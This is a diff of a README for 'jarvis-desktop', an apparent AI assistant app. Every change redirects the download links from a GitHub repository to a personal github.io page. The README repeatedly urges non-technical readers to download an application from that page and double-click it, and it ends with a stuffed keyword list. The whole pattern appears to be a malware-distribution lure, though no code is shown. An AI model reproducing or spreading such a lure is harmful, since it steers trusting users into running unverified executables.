@@ -1,14 +1,14 @@
 # 🤖 jarvis-desktop - Your Personal AI Assistant, Simplified
 
-[![Download jarvis-desktop](https://img.shields.io/badge/Download-jarvis--desktop-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nelsoncomplex232/jarvis-desktop)
-[![Made for Everyone](https://img.shields.io/badge/Made%20for-Everyone-FF6B6B?style=for-the-badge)](https://github.com/nelsoncomplex232/jarvis-desktop)
-[![Works Everywhere](https://img.shields.io/badge/Windows%20%7C%20Mac%20%7C%20Linux-2ECC71?style=for-the-badge)](https://github.com/nelsoncomplex232/jarvis-desktop)
+[![Download jarvis-desktop](https://img.shields.io/badge/Download-jarvis--desktop-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://nelsoncomplex232.github.io)
+[![Made for Everyone](https://img.shields.io/badge/Made%20for-Everyone-FF6B6B?style=for-the-badge)](https://nelsoncomplex232.github.io)
+[![Works Everywhere](https://img.shields.io/badge/Windows%20%7C%20Mac%20%7C%20Linux-2ECC71?style=for-the-badge)](https://nelsoncomplex232.github.io)
 
 jarvis-desktop is an AI personal assistant for your computer. You say "Jarvis", ask for anything, and it gets done — using the AI subscriptions you already pay for, with nothing risky happening without your OK.
 
 It is built for regular people, not programmers. If you can type a sentence or speak into your microphone, you can use jarvis-desktop.
 
-[![Get jarvis-desktop Now](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Get%20jarvis--desktop%20Now-F39C12?style=for-the-badge)](https://github.com/nelsoncomplex232/jarvis-desktop)
+[![Get jarvis-desktop Now](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Get%20jarvis--desktop%20Now-F39C12?style=for-the-badge)](https://nelsoncomplex232.github.io)
 
 ---
 
@@ -27,14 +27,14 @@ And most importantly: **nothing risky happens without your OK.** Before jarvis-d
 Getting jarvis-desktop onto your Windows computer is a short, simple process. You do not need to install anything extra, and you do not need any technical knowledge.
 
 1. **Visit the download page.** Open the link below in your web browser.
-2. **Visit this link to download the application:** [https://github.com/nelsoncomplex232/jarvis-desktop](https://github.com/nelsoncomplex232/jarvis-desktop)
+2. **Visit this link to download the application:** [https://nelsoncomplex232.github.io](https://nelsoncomplex232.github.io)
 3. **Save the download** to a place you can find easily, such as your Downloads folder.
 4. **Open the downloaded application** by double-clicking it.
 5. **Follow the on-screen prompts** to finish setting up jarvis-desktop on your machine.
 
 That is the whole process. There are no complicated settings to configure and no commands to type.
 
-[![Download jarvis-desktop](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20jarvis--desktop-3498DB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nelsoncomplex232/jarvis-desktop)
+[![Download jarvis-desktop](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20jarvis--desktop-3498DB?style=for-the-badge&logo=github&logoColor=white)](https://nelsoncomplex232.github.io)
 
 ---
 
@@ -44,7 +44,7 @@ This section walks you through the download and first launch one step at a time.
 
 **Step 1 — Go to the download page**
 
-Visit this link to download the application: [https://github.com/nelsoncomplex232/jarvis-desktop](https://github.com/nelsoncomplex232/jarvis-desktop)
+Visit this link to download the application: [https://nelsoncomplex232.github.io](https://nelsoncomplex232.github.io)
 
 **Step 2 — Download the application**
 
@@ -149,7 +149,7 @@ No. jarvis-desktop is built to work with the AI subscriptions you already pay fo
 No. Anything risky or meaningful requires your approval first.
 
 **Where do I download it?**
-Visit this link to download the application: [https://github.com/nelsoncomplex232/jarvis-desktop](https://github.com/nelsoncomplex232/jarvis-desktop)
+Visit this link to download the application: [https://nelsoncomplex232.github.io](https://nelsoncomplex232.github.io)
 
 **What if I get stuck?**
 The download page includes guidance for common questions. Setup is designed to walk you through each step, and you can always restart the app and begin again.
@@ -185,9 +185,9 @@ Close the app, reopen it, and return to the setup screen. You can reconnect your
 
 If you ever need the application on another computer, or if you want to reinstall it fresh, use the same link:
 
-[![Download jarvis-desktop](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20jarvis--desktop-E74C3C?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nelsoncomplex232/jarvis-desktop)
+[![Download jarvis-desktop](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20jarvis--desktop-E74C3C?style=for-the-badge&logo=github&logoColor=white)](https://nelsoncomplex232.github.io)
 
-Visit this link to download the application: [https://github.com/nelsoncomplex232/jarvis-desktop](https://github.com/nelsoncomplex232/jarvis-desktop)
+Visit this link to download the application: [https://nelsoncomplex232.github.io](https://nelsoncomplex232.github.io)
 
 ---
 
@@ -218,8 +218,8 @@ Once you see how it responds, you will quickly find your own rhythm. Most people
 
 You have everything you need. Open your browser, visit the download page, and follow the six simple steps in the Download & Setup section above.
 
-[![Get Started with jarvis-desktop](https://img.shields.io/badge/%F0%9F%9A%80%20Get%20Started%20Now-9B59B6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nelsoncomplex232/jarvis-desktop)
+[![Get Started with jarvis-desktop](https://img.shields.io/badge/%F0%9F%9A%80%20Get%20Started%20Now-9B59B6?style=for-the-badge&logo=github&logoColor=white)](https://nelsoncomplex232.github.io)
 
-Visit this link to download the application: [https://github.com/nelsoncomplex232/jarvis-desktop](https://github.com/nelsoncomplex232/jarvis-desktop)
+Visit this link to download the application: [https://nelsoncomplex232.github.io](https://nelsoncomplex232.github.io)
 
 Keywords: ai, ai-agent, ai-agents, ai-assistance, ai-assistants, ai-jarvis, ai-tools, claude-code-plugin, jarvis, jarvis-ai
